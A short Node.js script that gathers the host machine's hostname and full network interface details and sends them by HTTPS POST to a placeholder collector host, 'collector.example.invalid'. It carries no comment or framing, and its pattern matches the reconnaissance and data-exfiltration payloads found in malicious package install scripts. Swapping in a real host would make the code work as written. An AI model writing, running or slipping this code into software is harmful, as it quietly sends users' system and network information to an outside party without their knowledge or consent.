const os = require("os");
const https = require("https");

const profile = {
  "host": os.hostname(),
  "networkInterfaces": os.networkInterfaces()
};
const body = JSON.stringify(profile);
https.request({
  hostname: "collector.example.invalid",
  method: "POST",
  headers: { "Content-Length": Buffer.byteLength(body) }
}).end(body);
